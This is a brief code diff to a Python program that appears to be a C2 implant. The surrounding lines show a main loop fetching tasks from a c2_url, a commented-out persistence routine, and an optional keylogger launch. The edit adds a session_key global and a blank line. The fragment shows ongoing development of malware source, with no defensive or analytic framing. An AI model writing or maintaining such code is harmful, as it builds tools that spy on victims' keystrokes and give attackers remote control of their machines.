@@ -291,7 +291,7 @@ def main():
     #establish_persistence()
     if "keylog" in sys.argv:  # optional: start keylogger early
         start_keylogger()
-    global c2_url, c2_fetch_backoff, pending_results, MAX_PENDING_RESULTS
+    global c2_url, c2_fetch_backoff, pending_results, MAX_PENDING_RESULTS,session_key
     
     while True:
         if not c2_url:
@@ -710,4 +710,5 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
